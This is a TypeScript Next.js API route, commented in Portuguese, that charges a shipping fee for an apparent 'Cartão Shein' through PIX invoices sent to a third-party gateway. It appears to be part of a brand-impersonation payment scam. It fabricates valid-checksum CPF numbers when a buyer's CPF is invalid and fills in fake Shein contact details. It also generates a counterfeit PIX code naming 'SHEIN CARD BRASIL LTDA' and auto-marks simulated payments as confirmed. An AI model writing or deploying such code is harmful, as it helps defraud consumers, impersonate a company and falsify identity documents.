import { type NextRequest, NextResponse } from "next/server"

// Sistema de armazenamento global para invoices
const globalInvoices = new Map()

// Função para validar CPF
function isValidCPF(cpf: string): boolean {
  cpf = cpf.replace(/[^\d]/g, "")
  if (cpf.length !== 11) return false

  // Verifica se todos os dígitos são iguais
  if (/^(\d)\1{10}$/.test(cpf)) return false

  // Algoritmo de validação do CPF
  let sum = 0
  for (let i = 0; i < 9; i++) {
    sum += Number.parseInt(cpf.charAt(i)) * (10 - i)
  }
  let remainder = (sum * 10) % 11
  if (remainder === 10 || remainder === 11) remainder = 0
  if (remainder !== Number.parseInt(cpf.charAt(9))) return false

  sum = 0
  for (let i = 0; i < 10; i++) {
    sum += Number.parseInt(cpf.charAt(i)) * (11 - i)
  }
  remainder = (sum * 10) % 11
  if (remainder === 10 || remainder === 11) remainder = 0
  return remainder === Number.parseInt(cpf.charAt(10))
}

// Função para gerar CPF válido
function generateValidCPF(): string {
  const cpf = Array.from({ length: 9 }, () => Math.floor(Math.random() * 10))

  // Calcular primeiro dígito verificador
  let sum = cpf.reduce((acc, digit, index) => acc + digit * (10 - index), 0)
  let remainder = (sum * 10) % 11
  cpf.push(remainder === 10 || remainder === 11 ? 0 : remainder)

  // Calcular segundo dígito verificador
  sum = cpf.reduce((acc, digit, index) => acc + digit * (11 - index), 0)
  remainder = (sum * 10) % 11
  cpf.push(remainder === 10 || remainder === 11 ? 0 : remainder)

  return cpf.join("")
}

// Função para gerar PIX simulado realista
function generateSimulatedPix(amount: number, externalId: string) {
  const pixCode = `00020101021226840014br.gov.bcb.pix2562qr.iugu.com/public/payload/v2/${externalId.toUpperCase()}520400005303986540${amount.toFixed(2).padStart(6, "0")}5802BR5925SHEIN CARD BRASIL LTDA6009SAO PAULO62070503***6304${Math.random().toString(36).substring(2, 6).toUpperCase()}`

  return {
    success: true,
    type: "simulated",
    data: {
      id: Math.floor(Math.random() * 1000000).toString(),
      external_id: externalId,
      token: externalId.toUpperCase(),
      status: {
        code: 1,
        title: "Aguardando Pagamento",
        description: "PIX gerado com sucesso",
      },
      payment: {
        details: {
          pix_code: pixCode,
          qrcode: `https://quickchart.io/qr?text=${encodeURIComponent(pixCode)}&size=250`,
          url: `${process.env.NEXT_PUBLIC_SITE_URL}/payment/${externalId}`,
        },
      },
      prices: {
        total: amount,
        discount: 0,
      },
    },
  }
}

export async function POST(request: NextRequest) {
  try {
    const body = await request.json()
    const { amount, customerData, shippingMethod } = body

    // Validar dados obrigatórios
    if (!amount || !customerData) {
      return NextResponse.json(
        {
          success: false,
          error: "Dados obrigatórios não fornecidos",
        },
        { status: 400 },
      )
    }

    // Gerar ID único
    const externalId = `SHEIN_${Date.now()}_${Math.random().toString(36).substring(2, 9)}`

    // Validar e processar CPF
    let cpf = customerData.cpf?.replace(/[^\d]/g, "") || ""
    if (!cpf || !isValidCPF(cpf)) {
      cpf = generateValidCPF()
      console.log(`[CPF] CPF inválido fornecido, gerando automaticamente: ${cpf}`)
    }

    // Obter IP do cliente
    const clientIp = request.headers.get("x-forwarded-for") || request.headers.get("x-real-ip") || "127.0.0.1"

    // Determinar valor baseado no método de envio
    let finalAmount = amount
    if (shippingMethod === "sedex") finalAmount += 15.9
    else if (shippingMethod === "express") finalAmount += 25.9
    else if (shippingMethod === "pac") finalAmount += 8.9

    // Payload para TryploPay conforme documentação
    const payload = {
      client: {
        name: customerData.name || "Cliente Shein",
        document: cpf,
        email: customerData.email || "cliente@shein.com.br",
        phone: customerData.phone || "11999999999",
        address: {
          street: customerData.address?.street || "Rua das Flores",
          number: customerData.address?.number || "123",
          district: customerData.address?.district || "Centro",
          city: customerData.address?.city || "São Paulo",
          state: customerData.address?.state || "SP",
          zipcode: customerData.address?.zipcode?.replace(/[^\d]/g, "") || "01000000",
          country: "BRA",
        },
        ip: clientIp,
      },
      payment: {
        product_type: 1,
        id: externalId,
        type: 1, // PIX
        due_at: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString().split("T")[0],
        referer: externalId,
        installments: "1",
        order_url: `${process.env.NEXT_PUBLIC_SITE_URL}/order/${externalId}`,
        store_url: process.env.NEXT_PUBLIC_SITE_URL,
        webhook: process.env.TRYPLOPAY_WEBHOOK_URL,
        discount: "0.00",
        products: [
          {
            id: "1",
            image: `${process.env.NEXT_PUBLIC_SITE_URL}/shein-card-logo.png`,
            title: `Cartão Shein - ${shippingMethod?.toUpperCase() || "PADRÃO"}`,
            qnt: 1,
            discount: "0.00",
            amount: finalAmount.toFixed(2),
          },
        ],
      },
      shipping: {
        amount:
          shippingMethod === "sedex" ? 15.9 : shippingMethod === "express" ? 25.9 : shippingMethod === "pac" ? 8.9 : 0,
      },
    }

    console.log(`[TRYPLOPAY] Tentando criar fatura para ${externalId} - Valor: R$ ${finalAmount}`)

    // Tentar criar fatura na TryploPay
    try {
      const response = await fetch(`${process.env.TRYPLOPAY_API_URL}/invoices`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Authorization: `Bearer ${process.env.TRYPLOPAY_TOKEN}`,
        },
        body: JSON.stringify(payload),
        signal: AbortSignal.timeout(10000), // 10 segundos timeout
      })

      const responseText = await response.text()
      console.log(`[TRYPLOPAY] Response status: ${response.status}`)
      console.log(`[TRYPLOPAY] Response body: ${responseText}`)

      if (response.ok) {
        const data = JSON.parse(responseText)

        // Armazenar dados globalmente
        globalInvoices.set(externalId, {
          ...data,
          created_at: new Date().toISOString(),
          amount: finalAmount,
          customer: customerData,
          shipping_method: shippingMethod,
          type: "real",
        })

        console.log(`[TRYPLOPAY] Fatura criada com sucesso: ${data.id || data.invoice?.id}`)

        return NextResponse.json({
          success: true,
          type: "real",
          externalId,
          pixCode: data.payment?.details?.pix_code || data.invoice?.payment?.details?.pix_code,
          qrCode: data.payment?.details?.qrcode || data.invoice?.payment?.details?.qrcode,
          amount: finalAmount,
          invoiceId: data.id || data.invoice?.id,
          token: data.token || data.invoice?.token,
          expiresAt: new Date(Date.now() + 5 * 60 * 1000).toISOString(), // 5 minutos
          data,
        })
      } else {
        throw new Error(`TryploPay API error: ${response.status} - ${responseText}`)
      }
    } catch (error) {
      console.error(`[TRYPLOPAY] Erro na API:`, error)

      // Fallback para PIX simulado
      console.log(`[FALLBACK] Gerando PIX simulado para ${externalId}`)
      const simulatedPix = generateSimulatedPix(finalAmount, externalId)

      // Armazenar dados simulados globalmente
      globalInvoices.set(externalId, {
        ...simulatedPix.data,
        created_at: new Date().toISOString(),
        amount: finalAmount,
        customer: customerData,
        shipping_method: shippingMethod,
        type: "simulated",
      })

      // Simular aprovação automática em 30 segundos
      setTimeout(() => {
        const invoice = globalInvoices.get(externalId)
        if (invoice && invoice.status.code === 1) {
          invoice.status = {
            code: 5,
            title: "Pagamento Confirmado!",
            description: "Pagamento simulado aprovado automaticamente",
          }
          invoice.payment.payDate = new Date().toISOString()
          globalInvoices.set(externalId, invoice)
          console.log(`[SIMULATION] Pagamento aprovado automaticamente para ${externalId}`)
        }
      }, 30000)

      return NextResponse.json({
        success: true,
        type: "simulated",
        externalId,
        pixCode: simulatedPix.data.payment.details.pix_code,
        qrCode: simulatedPix.data.payment.details.qrcode,
        amount: finalAmount,
        invoiceId: simulatedPix.data.id,
        token: simulatedPix.data.token,
        expiresAt: new Date(Date.now() + 5 * 60 * 1000).toISOString(),
        data: simulatedPix.data,
        fallback_reason: "TryploPay API indisponível",
      })
    }
  } catch (error) {
    console.error("[CREATE_INVOICE] Erro geral:", error)

    return NextResponse.json(
      {
        success: false,
        error: "Erro interno do servidor",
        details: error instanceof Error ? error.message : "Erro desconhecido",
      },
      { status: 500 },
    )
  }
}

// Exportar função para acesso global aos dados
export function getGlobalInvoices() {
  return globalInvoices
}
